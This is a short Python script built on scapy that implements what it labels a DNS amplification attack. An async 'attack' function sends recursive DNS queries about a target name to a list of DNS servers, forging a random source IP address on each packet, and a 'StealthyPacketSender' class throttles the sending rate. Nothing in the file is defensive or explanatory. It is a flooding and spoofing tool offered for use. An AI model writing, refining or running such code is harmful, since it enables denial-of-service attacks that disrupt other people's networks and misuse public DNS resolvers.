import asyncio
import random
import time
from datetime import datetime
from scapy.all import IP, UDP, DNS, DNSQR, send
import ipaddress

class StealthyPacketSender:
    def __init__(self, max_rate, logger):
        self.max_rate = max_rate
        self.logger = logger
        self.sent_packets = 0
        self.start_time = time.time()

    async def send_packet(self, pkt):
        elapsed = time.time() - self.start_time
        if elapsed > 0:
            current_rate = self.sent_packets / elapsed
            if current_rate > self.max_rate:
                await asyncio.sleep(0.001)
        await asyncio.get_event_loop().run_in_executor(None, lambda: send(pkt, verbose=False))
        self.sent_packets += 1

def random_ip(subnet=None):
    if subnet:
        net = ipaddress.ip_network(subnet)
        return str(random.choice(list(net.hosts())))
    else:
        return '.'.join(str(random.randint(1, 254)) for _ in range(4))

async def attack(target, dns_servers, duration, max_rate, qtype='A', logger=None, output_format="text"):
    sender = StealthyPacketSender(max_rate, logger)
    query = DNSQR(qname=target, qtype=qtype)
    end_time = time.time() + duration
    packet_count = 0
    last_log_time = time.time()

    while time.time() < end_time:
        for dns_server in dns_servers:
            pkt = IP(src=random_ip(), dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=query)
            await sender.send_packet(pkt)
            packet_count += 1

        now = time.time()
        if now - last_log_time > 5:
            msg = f"[{datetime.now().strftime('%H:%M:%S')}] DNS Amplification: Sent {packet_count} packets to {target} via {dns_servers}"
            if logger:
                logger.info(msg)
            else:
                print(msg)
            last_log_time = now

        await asyncio.sleep(0.001)